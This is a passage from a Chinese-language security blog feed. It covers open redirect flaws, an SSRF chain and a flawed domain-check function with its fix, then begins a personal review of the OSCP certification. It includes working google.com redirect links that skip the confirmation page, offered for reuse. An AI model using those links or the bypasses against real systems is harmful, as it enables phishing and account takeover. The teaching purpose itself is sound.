的時候都會加強限制，redirect_uri 通常都會要求寫死，不讓你設置 wildcard，例如說我填 <code>https://example.com/auth</code>，就是真的只有這個網址可以過，其他不同 path 的網址都會失敗。但有些小公司沒有注意到這麼細，對於 redirect_uri 就沒有這麼多規範。</p>\n<p>像是這種 OAuth 結合 open redirect 達成 account takeover（帳號奪取）的例子其實不少，例如說這個：<a href=\"https://hackerone.com/reports/905607\">[cs.money] Open Redirect Leads to Account Takeover</a>，或是 GitHub 其實也有過這類型的漏洞：<a href=\"https://devcraft.io/2020/10/19/github-gist-account-takeover.html\">GitHub Gist - Account takeover via open redirect - $10,000 Bounty</a>，而這個 Airbnb 的漏洞也很精彩：<a href=\"https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/\">Authentication bypass on Airbnb via OAuth tokens theft</a>。</p>\n<p>總結一下，open redirect 的用處除了讓使用者放鬆戒心來進行釣魚以外，另一個就是繞過有針對 domain 進行檢查的地方。上面講的 SSRF 跟 OAuth 這兩個漏洞之所以能跟它結合，就是因為可以用 open redirect 來繞過對 domain 的檢查。</p>\n<h2 id=\"%E9%82%A3%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%E7%A6%A6-open-redirect%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%82%A3%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%E7%A6%A6-open-redirect%EF%BC%9F\">#</a> 那該怎麼防禦 open redirect？</h2>\n<p>如果想防止 open redirect，可想而知就是要對重新導向的網址進行檢查。這聽起來簡單，實作起來卻容易出現漏洞，例如說底下的例子是一段檢查 domain 的程式碼，根據取出的 hostname 比對是否含有 <code>cymetrics.io</code>，有的話就通過，目的是只有 <a href=\"http://cymetrics.io\">cymetrics.io</a> 跟它的 subdomain 可以通過：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> validDomain <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics.io'</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> host <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname <span class=\"token comment\">// 取出 hostname</span><br>  <span class=\"token keyword\">return</span> host<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>validDomain<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://example.com'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// false</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://dev.cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<p>感覺好像沒什麼問題？除了 <code>cymetrics.io</code> 或是它的 subdomain 以外，應該不會有其他網域可以通過這檢查吧？</p>\n<p>雖然看似如此，但其實有兩個方式可以繞過。這邊先假設 URL parsing 的方式不會有問題，一定會拿到 hostname，所以 <code>attacker.com?q=cymetrics.io</code> 這種方式是沒用的，hostname 會拿到 <code>attacker.com</code> 而已。</p>\n<p>大家可以想一下有哪兩種可以繞過，在公佈答案之前，先來看下一個段落。</p>\n<h2 id=\"google-%E5%B0%8D%E6%96%BC-open-redirect-%E7%9A%84%E7%9C%8B%E6%B3%95\"><a class=\"direct-link\" href=\"#google-%E5%B0%8D%E6%96%BC-open-redirect-%E7%9A%84%E7%9C%8B%E6%B3%95\">#</a> Google 對於 open redirect 的看法</h2>\n<p>Google 在官方網站 <a href=\"https://sites.google.com/site/bughunteruniversity/nonvuln/open-redirect\">Bughunter University</a> 當中有明確提到一般的 open redirect 不會被視為安全性上的漏洞，除非能證明它可以跟其他漏洞結合在一起使用。</p>\n<p>那是不是有人成功過呢？當然，底下我舉兩個例子。</p>\n<p>第一個例子來自這篇文章：<a href=\"https://blog.bentkowski.info/2018/07/vulnerability-in-hangouts-chat-aka-how.html\">Vulnerability in Hangouts Chat: from open redirect to code execution</a>，對象是 Google Hangouts Chat 的 Electron App。</p>\n<p>在那個 App 裡面如果網址是 <code>https://chat.google.com</code> 開頭的話，點擊網址就會直接在 Electron 裡面開啟網頁，而不是用瀏覽器去開。因此只要找到 <code>https://chat.google.com</code> 的 open redirect，就可以把使用者導去釣魚網站。而 Electron App 跟瀏覽器的差異之一就在於 Electron App 預設是不會有網址列的，所以使用者根本無從辨別這是不是釣魚網站。詳細的流程跟最後的 payload 可以參考原文，這個漏洞還可以進一步提升成 RCE（不過我不知道是怎麼做的就是了），價值 7500 USD。</p>\n<p>第二個例子來自官方的文章：<a href=\"https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter\">Open redirects that matter</a>，這個案例也是超帥。</p>\n<p>在 Google I/O 2015 的網站中有個功能是去抓 Picasa 的資料回來並 render 成 JSON，但因為有跨網域的問題，因此後端寫了一個簡單的 proxy 去拿資料，像這樣：<code>/api/v1/photoproxy?url=to</code>，而這個 proxy 會檢查 url 的開頭是否為 <code>https://picasaweb.google.com/data/feed/api</code>，如果不是的話就回傳錯誤。</p>\n<p>所以作者的第一個目標就是找到 picasa 上的 open redirect，他最後找到的是這個網址：<code>https://picasaweb.google.com/bye?continue=</code>，只要把這個網址改成：<code>https://picasaweb.google.com/data/feed/api/../../bye</code>，就可以成功通過路徑的檢查，讓 server 認為這是一個合法的 URL。</p>\n<p>但這還沒結束，因為 bye?continue= 這個 redirect 也會檢查參數，continue 必須是 <code>https://google.com</code> 開頭才可以。因此我們需要找到第二個 open redirect，這次是存在於 <a href=\"http://google.com\">google.com</a> 上面。而 <a href=\"http://google.com\">google.com</a> 有一個知名的 open redirect 是 AMP 用的，例如說 <code>https://www.google.com/amp/tech-blog.cymetrics.io</code>，就會連到 <a href=\"https://tech-blog.cymetrics.io\">https://tech-blog.cymetrics.io</a> （不過我剛嘗試了一下會先跳到中間頁，點擊確認後才會導向，應該是這功能有修正過了）。</p>\n<p>結合這兩個 open redirect，就可以讓 proxy 去抓取我們指定的 url 的內容：</p>\n<pre><code>https://picasaweb.google.com/data/feed/api/../../../bye/?\ncontinue=https%3A%2F%2Fwww.google.com%2Famp/\nyour-domain.example.com/path?querystring\n</code></pre>\n<p>可是抓了之後只會輸出成 JSON，有什麼用呢？後端的程式碼如下：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">servePhotosProxy</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    c <span class=\"token operator\">:=</span> <span class=\"token function\">newContext</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> r<span class=\"token punctuation\">.</span>Method <span class=\"token operator\">!=</span> <span class=\"token string\">\"GET\"</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusBadRequest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"invalid request method\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br>    url <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">FormValue</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>strings<span class=\"token punctuation\">.</span><span class=\"token function\">HasPrefix</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">\"https://picasaweb.google.com/data/feed/api\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusBadRequest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"url parameter is missing or is an invalid endpoint\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br>    req<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">NewRequest</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> <span class=\"token function\">errStatus</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br><br><br>    res<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">httpClient</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Do</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> <span class=\"token function\">errStatus</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br><br><br>    <span class=\"token keyword\">defer</span> res<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    w<span class=\"token punctuation\">.</span><span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><br>    w<span class=\"token punctuation\">.</span><span class=\"token function\">WriteHeader</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>StatusCode<span class=\"token punctuation\">)</span><br>    io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>因為有設置 content type，所以沒辦法用 MIME sniffing 去攻擊。簡單解釋一下 MIME sniffing，當你的 response 沒有設置 content type 的時候，瀏覽器就會自動去猜這是什麼內容，如果裡面含有 HTML 的話，那就會被當成是 HTML 網站來解析並且渲染。</p>\n<p>而作者發現了另一個 bug，就是如果是 error 的話，並不會設置 content type，只有成功的時候會，所以可以故意回傳一個含有 HTML 的錯誤訊息，這樣被印在畫面時瀏覽器就會把這整份當成是 HTML，進而達成 XSS！詳細的流程跟介紹原文都寫得很清楚，很推薦大家去看一下原文。</p>\n<p>以上就是兩個在 Google 中曾經被發現的 open redirect 串聯其他漏洞引起的攻擊，兩個都很有趣！</p>\n<p>看完上面這些之後，我突然很好奇有哪些 Google 的 open redirect 是大家都知道的，於是我就 google 了：<code>known google open redirect</code>，找到底下幾個網站：</p>\n<ol>\n<li><a href=\"https://nakedsecurity.sophos.com/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/\">How scammers abuse Google Search’s open redirect feature</a></li>\n<li><a href=\"https://blog.sean-wright.com/google-open-redirect/\">Google - Open Redirect</a></li>\n<li><a href=\"https://www.threatmark.com/google-bug-that-makes-your-bank-more-vulnerable-to-phishing/\">Google Bug that Makes Your Bank More Vulnerable to Phishing</a></li>\n</ol>\n<p>如果只是一般的 <a href=\"https://www.google.com/url?q=http://tech-blog.cymetrics.io\">https://www.google.com/url?q=http://tech-blog.cymetrics.io</a> 的話，點進去只會跳到確認頁面，但如果後面加一個參數 usg 的話，就可以不經過確認直接重新導向，不信你點點看這個，會去 <a href=\"http://example.org\">example.org</a>：<a href=\"https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA\">https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA</a></p>\n<p>那這個 usg 是什麼呢？應該是網址經過某種 hash 過後的結果，但你不會知道怎麼算出來的。而要獲得這個 usg 其實也不難，你用 gmail 寄信給自己，信裡面要有你想導向的連結，接著再用 HTML basic view 來看，就會看到信中的連結變成了上面格式的重新導向！</p>\n<p>像是這個，就是我們部落格的重新導向連結：<a href=\"https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug\">https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug</a></p>\n<p>實測之後發現真的能不經過確認就跳轉，這個功能好像已經存在滿久了，未來如果有需要 <a href=\"http://google.com\">google.com</a> 的 open redirect 可以參考看看。</p>\n<h2 id=\"%E6%AA%A2%E6%9F%A5-redirect-%E7%9A%84-domain\"><a class=\"direct-link\" href=\"#%E6%AA%A2%E6%9F%A5-redirect-%E7%9A%84-domain\">#</a> 檢查 redirect 的 domain</h2>\n<p>好，接著講回剛剛問大家的兩種繞過方式，我再貼一次檢查 domain 的程式碼，讓大家回憶一下，接著就直接公布答案：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> validDomain <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics.io'</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> host <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname <span class=\"token comment\">// 取出 hostname</span><br>  <span class=\"token keyword\">return</span> host<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>validDomain<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://example.com'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// false</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://dev.cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<p>這是在檢查 domain 時滿常會犯的錯誤，因為沒有考慮到以下兩種情形：</p>\n<ol>\n<li><a href=\"http://cymetrics.io.huli.tw\">cymetrics.io.huli.tw</a></li>\n<li><a href=\"http://fakecymetrics.io\">fakecymetrics.io</a></li>\n</ol>\n<p>上面這兩種情形都符合條件，但卻不是我們想要的結果。</p>\n<p>其實不只是檢查 domain，在做任何檢查的時候用 <code>includes</code> 或是 <code>contains</code> 直接去看整體是否包含某個字串都是一件比較危險的事情。最好的方式其實是設一個 allow list 並且要完全一致才通過，這樣是最嚴格的。但如果想要允許所有 subdomain 的話，可以這樣檢查：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> validDomain <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics.io'</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> host <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname <span class=\"token comment\">// 取出 hostname</span><br>  <span class=\"token keyword\">return</span> host <span class=\"token operator\">===</span> validDomain <span class=\"token operator\">||</span> host<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> validDomain<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>subdomain 的部分結尾要是 <code>.cymetrics.io</code>，所以一定會是 <a href=\"http://cymetrics.io\">cymetrics.io</a> 的 subdomain，而主要的 domain 也要完全符合才可以。不過這樣寫的話，如果某一個不相干的 subdomain 有 open redirect 的漏洞，這段就破功了。因此還是建議大家只把確定會 redirect 的 domain 放進去並且直接用 <code>===</code> 做檢查，避免這種狀況發生。</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>重新導向是個很常見的功能，最常見的就是登入前點了某個連結之後轉到登入頁面，登入成功就會自動跳轉回去。在做這個功能時，如果是前端重新導向，再次提醒大家，要考慮到 <code>window.location = 'javascript:alert(1)'</code> 這樣會出事，請確認重新導向的 URL 是合法的 URL 再做動作。另外，也要確認檢查 domain 時有考慮到可能會被繞過的狀況，盡可能用最嚴謹的方式去處理。</p>\n<p>以上就是對 open redirect 的介紹，希望對大家有幫助，有什麼疑問或是寫錯的地方都可以在下面留言跟我討論。</p>\n<p>參考資料：</p>\n<ol>\n<li><a href=\"https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/\">The real impact of an Open Redirect vulnerability</a></li>\n<li><a href=\"https://blog.intigriti.com/hackademy/open-redirect/\">Intigriti: Open Redirect</a></li>\n<li><a href=\"https://gauravnarwani.com/misconfigured-oauth-to-account-takeover/\">Misconfigured OAuth leading to Account Takeover</a></li>\n<li><a href=\"https://s0cket7.com/open-redirect-vulnerability/\">Open Redirect Vulnerability</a></li>\n<li><a href=\"https://devcraft.io/2020/10/19/github-gist-account-takeover.html\">GitHub Gist - Account takeover via open redirect - $10,000 Bounty</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover\">OAuth to Account takeover</a></li>\n</ol>\n",
      "date_published": "2021-09-07T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/oscp-review/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/oscp-review/",
      "title": "我們與 OSCP 的距離",
      "content_html": "<!-- summary --> \n<!-- 八月的某一個凌晨，終於完成報告然後跟考官道別結束考試，半年的奮戰也告一段落。期待已久的 OSCP 到手啦！半年前 OSCP 對我而言也是 castle in the cloud，今天來分享這張證照是什麼，以及我自己的準備過程與心得。 -->\n<!-- summary -->\n<p>資安領域中，多數人都聽過一張標榜最有公信力的證照，就是不少公司跟求職者趨之若鶩的 OSCP。<br>\n常聽很多人說，OSCP 證照是『小魔王』，考前像在地獄爬一圈，考完前途一片光明，多少人考了四五次都沒過，簡直不要太殘忍。這張證照到底是何方神聖能被形容成這樣呢？</p>\n<h2 id=\"%E9%97%9C%E6%96%BC-oscp\"><a class=\"direct-link\" href=\"#%E9%97%9C%E6%96%BC-oscp\">#</a> 關於 OSCP</h2>\n<p>OSCP （Offensive Security Certified Professional）是 Offensive Security 這家公司發行的一系列證照之一，也是他的入門款第一張（對你沒聽錯，這個大魔王其實是難度比較低的基礎款喔）。Offensive Security 每隔一陣子就會更新課程內容跟證照類型，所以有一些證照現在已經不能考或是改名了，現階段發行的證照可以去官網查詢：<br>\n<figure><img src=\"/img/posts/crystal/oscp/oscp-certs.png\" /><figcaption><p>OSCP 證照們</p>\n</figcaption></figure></p>\n<p>從下面這個編號命名規則跟學習流程圖也可以看出 OSCP 的編號 PEN-200 是最基礎也最 general 的。後續有更深入的 OSEP(PEN-300) 以及專精網頁攻擊的 OSWP(WEB-300) 跟專攻 exploit 開發的 OSED(EXP-301) OSEE(EXP-401) 等等。</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/certs-journey.png\" /><figcaption><p>PWK journey</p>\n</figcaption></figure></p>\n<p>忘了之前是在哪個網站看到的，有一張截止今年二月各種資安證照的示意圖，感覺應該是依照難度跟領域劃分的，放這裡僅供想考證照的人參考。可以看到 OSCP 在最右邊中上的地方：</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/certs-all.png\" /><figcaption><p>各種資安證照</p>\n</figcaption></figure></p>\n<p>回到 OSCP，這張證照的考試內容算是比較廣泛的，就是模擬你進到內網裡面有一堆機器，你要如何快速找出一些淺顯的弱點（例如版本過舊的軟體、看起來很可疑的網站、權限沒鎖好的服務等等）並收集資訊，然後利用這些弱點進到機器獲得低權限，再試圖提權拿到最高權限。</p>\n<p>説 OSCP 是入門的原因也是因為，課程中大多數設計好的『漏洞』通常都是有公開 exploit （可能需要一點手動修改）或是一些需要手動執行但是概念簡單的問題（例如 SQL injection），但並不會需要你自己從頭挖掘或撰寫一份 exploit（當然你要把手動執行的部分自動化也是不錯的練習），簡言之，一切都是『已知的』，只是你有沒有觀察到而已。我的感想是，這個考試只是過濾掉一些 script kiddie 並訓練你基本技巧的熟練度跟分辨 rabbit hole，不會讓你變成漏洞挖掘大師 XDD</p>\n<h3 id=\"%E8%80%83%E8%A9%A6%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#%E8%80%83%E8%A9%A6%E6%96%B9%E5%BC%8F\">#</a> 考試方式</h3>\n<p>OSCP 不是一般筆試，而是給你 24 小時打下 5 台機器的上機考，然後還會有 24 小時可以寫一份完整的滲透測試報告，所以總計是一個 24+24 小時的考試。因為現在是上機部分全程監考，所以你要在預定考試的前 15 分鐘先進去一個 portal 跟考官核對身份、確認環境（要拿起電腦讓他看到整個房間跟桌子下）、開螢幕分享跟攝影機，這時間如果因為設備或是其他問題 delay 就是吃到你自己的考試時間，所以建議考前自己測試一下。開始考試後考官全程會盯著你跟你的螢幕們看，要暫停或是中離都要跟他說一聲，回來也要。不用擔心，他們會輪班監考，不會陪你通宵。</p>\n<p>考 24 小時聽起來很可怕，不過考試的設計也不是要你 24 小時都在電腦前面敲敲打打，他是有考慮到睡覺吃飯休息運動等日常生活的，之前在 reddit 上看到有人說，考試設計是你應該在 12 小時內就可以完成的，所以不用到廢寢忘食啦！（雖然會想考這張的應該打 CTF 也常常不小心玩到通霄 XDD）</p>\n<p>如果你有到寫報告的階段，會再有 24 小時可以寫一份專業的滲透測試報告，寫完壓縮上傳到一個網站，送出就不能再修改，格式內容檔名都不行。這部分官方有提供一個模板，社群也有很多改良版本，讓你可以把考試機器的過程填格子填好，前後罐頭文字都不用動，就算是沒寫過報告的也可以滿簡單的完成。要別注意的是，前面上機考的時間一結束你就再也進不去了考試環境了，所以缺截圖少步驟也沒辦法補上，請培養隨時截圖並做筆記記錄步驟跟結果的習慣。我自己是一邊打一邊寫，打完一台就把整個過程完整寫進報告裡，所以上機考完差不多就可以交報告了。</p>\n<p>每台機器都有配分，分別是 25 25 20 20 10，總共滿分 100 分，這個配分指的是你可以從這台機器拿到的最高分數，也就是說一台 25 分的機器你要拿到最高權限的 flag 並且報告都沒被扣分才能拿到 25 分，如果你只拿到低權限的 flag 或是報告沒寫好，就只有部分分數甚至沒分（報告是看得很重的）。最後必須至少 70 分才會通過考試，所以上機可以的話多拿一點分數比較保險，如果連 70 分都沒有也就可以不用寫報告了。另外，聽說 lab 跟課程的 exercise 如果有做完然後寫完整的 writeup 有機會加五分，不過我覺得 CP 值頗低所以沒做。</p>\n<h3 id=\"%E8%AA%B2%E7%A8%8B%E8%88%87%E8%A8%AD%E5%82%99\"><a class=\"direct-link\" href=\"#%E8%AA%B2%E7%A8%8B%E8%88%87%E8%A8%AD%E5%82%99\">#</a> 課程與設備</h3>\n<p>OSCP 的考試是跟課程綁在一起的，也就是你報名的是 PEN-200 這個課程然後會附帶考試機會一次，後續要是沒考過可以再買補考，不過第一次是不能只買考試的。（現在官網還有買 365 天加考試機會兩次的方案，真的會有人買嗎）</p>\n<p>那課程內容有哪些呢？當你報名之後會收到教材包，裡面有壓縮後 4GB 的影片們與 851 頁的 PDF 講義，影片跟講義的章節跟內容都是對應的，可以想像成是動畫有聲書（？）然後還有登入 VPN 跟論壇的一組帳號密碼。</p>\n<p>首先，開始前你需要準備幾樣東西。</p>\n<p>第一是一台 kali，教材包裡面官方會寄給你一台舊一點的版本，不過我是用我自己的 kali，雖然有聽過別人討論不同版本有些工具會出問題（kali 是 rolling release 會一直更新），不過我自己是沒遇到什麼 google 無法解決的問題啦，考試也很順利。</p>\n<p>第二是做筆記的軟體。我用的是 kali 內建的 cherrytree，不過我覺得用自己熟悉的就行。讀講義跟練 lab 的時候，要有條理地整理自己嘗試的方法、步驟、指令、甚至截圖，不管是不是要寫 writeup，留個紀錄都好。說不定考試的時候剛好遇到一個似曾相識的狀況，這時候有筆記跟步驟就會讓你安心許多，而且平時就培養做好筆記的習慣，考試也不容易東漏西漏最後還要回去一直補洞。</p>\n<p>考試的話，排好時辰之後你會收到一封信告訴你需要準備哪些東西跟一個 FAQ 網址。設備不外乎就是：</p>\n<ul>\n<li>鏡頭：我用 mac 的內嵌鏡頭但也可以外接，畫質要讓考官可以清楚看見你的身份證明文件</li>\n<li>還算通順的網路：官方給你的 VPN 包會附說明跟你說 ping time 多少比較好，我平常在家練 lab 大概是下載上傳 16Mbps/3Mbps，除了 RDP 跟 tunneling 之後有一點卡之外大致上都還行，不過考試的時候除了 VPN 還要分享鏡頭跟螢幕，全程視訊真的是會 lag，所以我是到學校用超高速網路 XDD 我覺得保守一點一般 100Mbps/60Mbps 應該就很順暢了。</li>\n<li>身份證明文件：政府發行的證件，但必須是英文的，所以台灣人應該只能用護照了吧（？）注意這個要跟你註冊的名字一樣！！</li>\n</ul>\n<h3 id=\"%E8%AA%B2%E7%A8%8B%E5%85%A7%E5%AE%B9\"><a class=\"direct-link\" href=\"#%E8%AA%B2%E7%A8%8B%E5%85%A7%E5%AE%B9\">#</a> 課程內容</h3>\n<p>講義的部分內容依據章節順序大概是：</p>\n<ol>\n<li>介紹 PWK(PEN-200)：包含課程、環境、報告、考試規範等等</li>\n<li>基礎\n<ol>\n<li>Kali 教學：怎麼安裝跟使用 kali linux，還有 command line 教學</li>\n<li>工具介紹：netcat, powershell, wireshark 等等常用工具</li>\n<li>寫簡單的 bash script</li>\n</ol>\n</li>\n<li>資料收集：\n<ol>\n<li>Passive recon: google hacking, email password dump...</li>\n<li>Active recon （各種服務的資訊收集）\n<ol>\n<li>port scanning</li>\n<li>DNS, SMB, NFS, SMTP, SNMP 等等的枚舉技巧</li>\n</ol>\n</li>\n<li>Vulnerability scanning</li>\n</ol>\n</li>\n<li>網頁攻擊：\n<ol>\n<li>手動勘查、工具使用</li>\n<li>XSS, Directory traversal, File inclusion, SQL injection...</li>\n</ol>\n</li>\n<li>Buffer Overflow (Windows + Linux)：最簡單的那種，連 NX 都沒開，return address + shellcode 結束這一回合</li>\n<li>Client-Side Attacks: HTA, Microsoft Word...（惡意軟體實作入門 XDD）</li>\n<li>尋找、修改、編譯、使用 public exploit</li>\n<li>file transfer 的技巧</li>\n<li>避開防毒軟體</li>\n<li>提權（Privilege Escalation）</li>\n<li>爆密碼</li>\n<li>port forwarding 跟 tunneling 的小技巧</li>\n<li>Active Directory (AD)</li>\n<li>Metasploit 跟 Powershell Empire 教學</li>\n<li>完整滲透測試的一次 walkthrough</li>\n</ol>\n<p>基本上，如果不是完全沒有一點資訊背景，我覺得可以跳過第二段基礎的部分。然後如果是純粹為了短時間內通過考試，可以先跳過 passive recon、client-side attack、防毒、port forwarding、AD、Metasploit（禁用）這些章節，扣掉零零總總大概剩 3/5 的內容。雖然扣除的部分都還蠻有趣而且現實中也實用，不過因為考試中不會/不能出現，所以趕時間的朋友可以重點練下面幾個技巧：</p>\n<ul>\n<li>Active recon</li>\n<li>網頁攻擊</li>\n<li>public exploit</li>\n<li>file transfer</li>\n<li>提權（Privilege Escalation）</li>\n</ul>\n<p>我自己因為在報名 OSCP 之前玩了好一陣子的 Hack The Box (HTB)，所以對課程主題都有一點熟悉度了，講義影片這邊只花了兩三天快速看過加補足一些沒看過的技巧。依據 reddit 上的討論，如果是完全沒接觸過的話，建議把講義從頭讀一遍（或是看完影片）並整理自己的筆記，exercise 